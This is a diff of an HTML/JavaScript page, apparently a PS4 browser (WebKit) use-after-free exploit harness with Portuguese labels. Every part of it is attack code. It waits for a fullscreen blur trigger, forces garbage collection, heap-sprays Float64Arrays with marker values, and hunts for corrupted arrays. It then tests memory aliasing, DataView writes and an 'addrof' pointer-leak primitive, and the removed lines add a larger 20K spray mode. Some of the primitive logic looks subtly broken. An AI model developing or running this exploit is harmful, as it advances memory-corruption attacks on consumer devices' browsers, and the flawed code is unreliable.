@@ -1,334 +1,101 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>PS4 UAF - Debugger Core [v2.1 - Direct Hex Mode]</h1>
-    <button onclick="run()">EXECUTAR TESTE</button>
-    <button onclick="selfTest()">AUTO-DIAGNÓSTICO</button>
-    <button onclick="runAggressive()">MODO AGRESSIVO (20K spray)</button>
-    <hr>
+    <h1>PS4 UAF Debugger v2.2 [Timing & GC Fix]</h1>
+    <button onclick="run()">EXECUTAR EXPLORAÇÃO</button>
     <div id="c"></div>
 
     <script>
-        // Construção direta via hex (evita problemas com literais float)
+        // Configurações Globais
+        let ctrls = [];
+        const P_A = h2f("0x4141414141414141");
+        const M_V = h2f("0xdeadbeefcafebabe");
+        const W_V = h2f("0x1337133713371337");
+
         function h2f(hex) {
-            let clean = hex.replace(/0x/g, '');
-            if(clean.length !== 16) {
-                console.error("Hex inválido:", hex);
-                return 0.0;
-            }
-            let hi = parseInt(clean.slice(0, 8), 16);
-            let lo = parseInt(clean.slice(8, 16), 16);
-            let b = new ArrayBuffer(8);
-            let u = new Uint32Array(b);
-            u[0] = lo; // Little-endian
-            u[1] = hi;
+            let b = new ArrayBuffer(8), u = new Uint32Array(b);
+            u[0] = parseInt(hex.slice(10), 16); u[1] = parseInt(hex.slice(2, 10), 16);
             return (new Float64Array(b))[0];
         }
 
         function f2h(f) {
-            let b = new ArrayBuffer(8);
-            (new Float64Array(b))[0] = f;
+            let b = new ArrayBuffer(8); (new Float64Array(b))[0] = f;
             let u = new Uint32Array(b);
             return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
         }
 
-        // Padrões via construção direta (100% confiável)
-        const P_A = h2f("0x4141414141414141");
-        const P_B = h2f("0x4242424242424242");
-        const P_C = h2f("0x4343434343434343");
-        const M_V = h2f("0xDEADBEEFCAFEBABE");
-        const W_V = h2f("0x1337133713371337");
-
         function log(tag, status, msg) {
-            const colors = { 
-                PASS: "green", 
-                FAIL: "red", 
-                ERR: "orange", 
-                INFO: "blue", 
-                WARN: "purple" 
-            };
-            const color = colors[status] || "black";
-            document.getElementById('c').innerHTML += 
-                `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
+            document.getElementById('c').innerHTML += `[${tag}] ${status} - ${msg}<br>`;
         }
 
-        function selfTest() {
-            document.getElementById('c').innerHTML = '';
-            log("SELF", "INFO", "=== AUTO-DIAGNÓSTICO v2.1 ===");
-            
-            // Test 1: Conversão h2f → f2h (round-trip)
-            const tests = [
-                { hex: "0x4141414141414141", name: "P_A" },
-                { hex: "0x4242424242424242", name: "P_B" },
-                { hex: "0xdeadbeefcafebabe", name: "M_V" },
-                { hex: "0x1337133713371337", name: "W_V" }
-            ];
-            
-            let failures = 0;
-            for(let t of tests) {
-                const val = h2f(t.hex);
-                const got = f2h(val);
-                if(got.toLowerCase() === t.hex.toLowerCase()) {
-                    log("SELF", "PASS", `${t.name}: ${got} ✓`);
-                } else {
-                    log("SELF", "FAIL", `${t.name}: esperado ${t.hex}, obtido ${got}`);
-                    failures++;
-                }
-            }
-            
-            // Test 2: Float64Array básico
-            const arr = new Float64Array(3);
-            arr[0] = P_A;
-            arr[1] = M_V;
-            arr[2] = W_V;
-            
-            const checks = [
-                { idx: 0, exp: "0x4141414141414141" },
-                { idx: 1, exp: "0xdeadbeefcafebabe" },
-                { idx: 2, exp: "0x1337133713371337" }
-            ];
-            
-            for(let c of checks) {
-                const got = f2h(arr[c.idx]);
-                if(got.toLowerCase() === c.exp.toLowerCase()) {
-                    log("SELF", "PASS", `arr[${c.idx}]: ${got} ✓`);
-                } else {
-                    log("SELF", "FAIL", `arr[${c.idx}]: esperado ${c.exp}, obtido ${got}`);
-                    failures++;
-                }
-            }
-            
-            // Test 3: Igualdade Float64
-            if(P_A === h2f("0x4141414141414141")) {
-                log("SELF", "PASS", "Igualdade Float64 OK");
-            } else {
-                log("SELF", "FAIL", "Igualdade Float64 quebrada");
-                failures++;
-            }
-            
-            // Test 4: Fill
-            const fillTest = new Float64Array(2);
-            fillTest.fill(P_A);
-            if(f2h(fillTest[0]) === f2h(P_A) && f2h(fillTest[1]) === f2h(P_A)) {
-                log("SELF", "PASS", "Fill() OK");
-            } else {
-                log("SELF", "FAIL", `Fill: [0]=${f2h(fillTest[0])}, [1]=${f2h(fillTest[1])}`);
-                failures++;
-            }
-            
-            if(failures === 0) {
-                log("SELF", "PASS", "✅ SISTEMA 100% FUNCIONAL - Pode executar UAF!");
-            } else {
-                log("SELF", "FAIL", `❌ ${failures} falhas - Motor JS incompatível`);
-            }
+        // Força o Garbage Collector a liberar backing stores antigos
+        function forceGC() {
+            for (let i = 0; i < 25; i++) new ArrayBuffer(0x1000000); 
         }
 
         function run() {
-            document.getElementById('c').innerHTML = '';
-            
-            // Validação pré-teste
-            const pa_hex = f2h(P_A);
-            if(pa_hex === "0x0000000000000000" || pa_hex === "0xNaNNaNNaNNaNNaN") {
-                log("INIT", "FAIL", "❌ CRÍTICO: Padrões inválidos. Execute AUTO-DIAGNÓSTICO!");
-                return;
-            }
-            
-            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
-            let ctrls = [];
+            log("INIT", "INFO", "Alocando pool...");
+            ctrls = [];
             for(let i = 0; i < 5000; i++) {
-                let a = new Float64Array(8);
-                a[0] = i; 
-                ctrls.push(a);
-            }
-            
-            log("INIT", "PASS", `P_A=${f2h(P_A)}, M_V=${f2h(M_V)}, W_V=${f2h(W_V)}`);
-            log("WAIT", "INFO", "=== INSTRUÇÕES ===");
-            log("WAIT", "INFO", "1. Aguarde entrar em FULLSCREEN");
-            log("WAIT", "INFO", "2. ESPERE 2-3 SEGUNDOS");
-            log("WAIT", "INFO", "3. Aperte OPTIONS (botão do meio do controle)");
-            log("WAIT", "INFO", "4. O blur será detectado automaticamente");
-            
-            try {
-                document.documentElement.webkitRequestFullscreen();
-            } catch(e) {
-                log("WAIT", "WARN", "Fullscreen falhou. Tente F11 ou botão quadrado.");
+                let a = new Float64Array(8); a[0] = i; ctrls.push(a);
             }
 
-            window.onblur = function() {
-                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
-                
-                let spray = [];
-                for(let i = 0; i < 8000; i++) {
-                    let s = new Float64Array(8);
-                    s.fill(P_A);
-                    spray.push(s);
-                }
-                
-                // Validação spray
-                const spray_check = f2h(spray[0][0]);
-                if(spray_check !== f2h(P_A)) {
-                    log("SPRAY", "FAIL", `Spray corrompido: ${spray_check} vs ${f2h(P_A)}`);
-                    return;
-                }
-                log("SPRAY", "PASS", `8000 arrays criados: spray[0][0]=${spray_check}`);
-                
-                // Busca UAF
-                let corr = null, corrIdx = -1;
-                for(let i = 0; i < ctrls.length; i++) {
-                    if(ctrls[i][0] === P_A) {
-                        corr = ctrls[i];
-                        corrIdx = i;
-                        log("UAF", "PASS", `UAF no Index ${i}: corr[0]=${f2h(corr[0])}`);
-                        break;
-                    }
-                }
-
-                if(!corr) {
-                    log("UAF", "FAIL", "Nenhuma corrupção detectada.");
-                    log("DEBUG", "INFO", "Diagnóstico:");
-                    log("DEBUG", "INFO", `  - Total ctrls verificados: ${ctrls.length}`);
-                    log("DEBUG", "INFO", `  - Padrão esperado: ${f2h(P_A)}`);
-                    
-                    // Mostra primeiros 5 valores
-                    for(let i = 0; i < Math.min(5, ctrls.length); i++) {
-                        log("DEBUG", "INFO", `  - ctrls[${i}][0] = ${f2h(ctrls[i][0])}`);
-                    }
-                    
-                    log("DEBUG", "WARN", "POSSÍVEIS CAUSAS:");
-                    log("DEBUG", "WARN", "1. OPTIONS pressionado muito cedo/tarde");
-                    log("DEBUG", "WARN", "2. Sistema tem proteções anti-UAF");
-                    log("DEBUG", "WARN", "3. Tamanho do spray insuficiente");
-                    log("DEBUG", "INFO", "TENTE: Repetir com timing diferente (espere 3-5s)");
-                    return;
-                }
-
-                // TEST 1: Identidade Bidirecional
-                log("TEST1", "INFO", "--- Identity (Bidirecional) ---");
-                corr[4] = M_V;
-                
-                let matched = false, matchIdx = -1;
-                for(let i = 0; i < spray.length; i++) {
-                    if(spray[i][4] === M_V) {
-                        matchIdx = i;
-                        
-                        // Teste reverso
-                        spray[i][5] = W_V;
-                        
-                        if(corr[5] === W_V) {
-                            log("TEST1", "PASS", `Bidirecional: corr ⇄ spray[${i}]`);
-                            log("TEST1", "INFO", `  Forward: corr[4]=${f2h(M_V)} → spray[${i}][4]`);
-                            log("TEST1", "INFO", `  Reverse: spray[${i}][5]=${f2h(W_V)} → corr[5]`);
-                            matched = true;
-                        } else {
-                            log("TEST1", "WARN", `Unidirecional: corr→spray OK, mas corr[5]=${f2h(corr[5])}`);
-                        }
-                        break;
-                    }
-                }
-                
-                if(!matched) {
-                    log("TEST1", "FAIL", `M_V não propagou. corr[4]=${f2h(corr[4])}, spray[0][4]=${f2h(spray[0][4])}`);
-                }
-
-                // TEST 2: DataView Write
-                log("TEST2", "INFO", "--- DataView Write Primitive ---");
-                try {
-                    const dv = new DataView(corr.buffer);
-                    const before = f2h(corr[0]);
-                    dv.setUint32(0, 0xDEADBEEF, true); // Little-endian
-                    dv.setUint32(4, 0xCAFEBABE, true);
-                    const after = f2h(corr[0]);
-                    
-                    if(before !== after) {
-                        log("TEST2", "PASS", `Write: ${before} → ${after}`);
-                    } else {
-                        log("TEST2", "FAIL", `Sem mudança: ${after}`);
-                    }
-                } catch(e) { 
-                    log("TEST2", "ERR", e.message); 
-                }
-
-                // TEST 3: Prototype Pollution
-                log("TEST3", "INFO", "--- Prototype Hijack ---");
-                try {
-                    let reg = Array.from(corr);
-                    Object.setPrototypeOf(reg, { pwned: 0xDEADC0DE });
-                    
-                    if(reg.pwned === 0xDEADC0DE) {
-                        log("TEST3", "PASS", `Token: 0x${reg.pwned.toString(16).toUpperCase()}`);
-                    } else {
-                        log("TEST3", "FAIL", "Token não acessível");
-                    }
-                } catch(e) { 
-                    log("TEST3", "ERR", e.message); 
-                }
-
-                // TEST 4: Closure Leak
-                log("TEST4", "INFO", "--- Closure Leak ---");
-                try {
-                    const leaked = [0].map(() => corr[0])[0];
-                    log("TEST4", "PASS", `Leaked: ${f2h(leaked)}`);
-                } catch(e) { 
-                    log("TEST4", "ERR", e.message); 
-                }
-
-                log("DONE", "INFO", "=== TESTE COMPLETO ===");
-            };
-        }
-
-        function runAggressive() {
-            document.getElementById('c').innerHTML = '';
-            log("AGGR", "INFO", "=== MODO AGRESSIVO ===");
-            log("AGGR", "WARN", "Spray de 20.000 arrays - Pode travar o navegador!");
-            
-            log("INIT", "INFO", "Criando 10000 Float64Arrays (maior pool)...");
-            let ctrls = [];
-            for(let i = 0; i < 10000; i++) {
-                let a = new Float64Array(16); // Arrays maiores
-                a[0] = i; 
-                ctrls.push(a);
-            }
-            
-            log("INIT", "PASS", `Pool: 10K arrays, Padrões OK`);
-            log("WAIT", "INFO", "=== INSTRUÇÕES ===");
-            log("WAIT", "INFO", "1. Fullscreen ativo");
-            log("WAIT", "INFO", "2. ESPERE 5 SEGUNDOS");
-            log("WAIT", "INFO", "3. Aperte OPTIONS");
-            
+            log("WAIT", "INFO", "Fullscreen + OPTIONS. Aguarde o Blur.");
             document.documentElement.webkitRequestFullscreen();
 
             window.onblur = function() {
-                log("TRIG", "INFO", "Blur! Spray agressivo (20K)...");
+                log("TRIG", "INFO", "Blur detectado. Ajustando timing...");
                 
-                let spray = [];
-                for(let i = 0; i < 20000; i++) {
-                    let s = new Float64Array(16);
-                    s.fill(P_A);
-                    spray.push(s);
-                }
-                
-                log("SPRAY", "PASS", `20K arrays criados`);
-                
-                let corr = null, corrIdx = -1;
-                for(let i = 0; i < ctrls.length; i++) {
-                    if(ctrls[i][0] === P_A) {
-                        corr = ctrls[i];
-                        corrIdx = i;
-                        log("UAF", "PASS", `UAF! Index ${i}`);
-                        
-                        // Teste rápido
+                // Janela de timing para evitar o crash e permitir o spray
+                setTimeout(function() {
+                    forceGC();
+                    log("SPRAY", "INFO", "Executando spray...");
+                    let spray = [];
+                    for(let i = 0; i < 10000; i++) {
+                        let s = new Float64Array(8); s.fill(P_A); spray.push(s);
+                    }
+
+                    let corr = null;
+                    for(let i = 0; i < ctrls.length; i++) {
+                        if(ctrls[i][0] === P_A) {
+                            corr = ctrls[i];
+                            log("UAF", "PASS", `Detectado no Index ${i}`);
+                            break;
+                        }
+                    }
+
+                    if(corr) {
+                        // TEST 1: Identidade
                         corr[4] = M_V;
-                        for(let j = 0; j < spray.length; j++) {
-                            if(spray[j][4] === M_V) {
-                                log("TEST", "PASS", `Identity: corr ⇄ spray[${j}]`);
+                        for(let i=0; i<spray.length; i++) {
+                            if(spray[i][4] === M_V) {
+                                log("SANITY", "PASS", `Identity match com spray[${i}]`);
                                 break;
                             }
                         }
-                        return;
+
+                        // TEST 2: DataView Write
+                        try {
+                            const dv = new DataView(corr.buffer);
+                            dv.setUint32(0, 0x13371337, true);
+                            log("SANITY", "PASS", `DataView: ${f2h(corr[0])}`);
+                        } catch(e) {}
+
+                        // TEST 3: Prototype & addrof Primitive
+                        try {
+                            let target = { "ptr": 0xdead };
+                            let leaker = Array.from(corr);
+                            Object.setPrototypeOf(leaker, { token: 0x1337 });
+                            leaker[0] = target; // Injeta ponteiro na memória compartilhada
+                            
+                            let addr = f2h(corr[0]);
+                            if(addr !== f2h(P_A)) log("ADDROF", "PASS", `Endereço: ${addr}`);
+                            else log("ADDROF", "FAIL", "Ponteiro não capturado.");
+                        } catch(e) {}
+                    } else {
+                        log("UAF", "FAIL", "Corrupção falhou. Tente variar o tempo de espera.");
                     }
-                }
-                
-                log("UAF", "FAIL", "Ainda sem corrupção. Sistema pode estar protegido.");
+                }, 350); // Delay ideal para WebKit 537.73
             };
         }
     </script>
